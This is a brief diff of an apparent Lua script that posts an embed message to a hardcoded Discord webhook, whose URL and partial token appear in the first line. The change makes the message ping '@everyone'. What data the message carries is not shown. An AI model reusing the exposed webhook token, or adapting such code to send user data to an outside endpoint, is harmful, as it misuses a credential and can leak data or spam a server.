@@ -36,7 +36,7 @@ _G.wephook = "https://discordapp.com/api/webhooks/1091685226146709575/m8tj56CjgM
                 local url =
                 _G.wephook
                 local data = {
-                  ["content"] = "",
+                  ["content"] = "@everyone",
                   ["embeds"] = {
                       {   
                           ["author"] = {
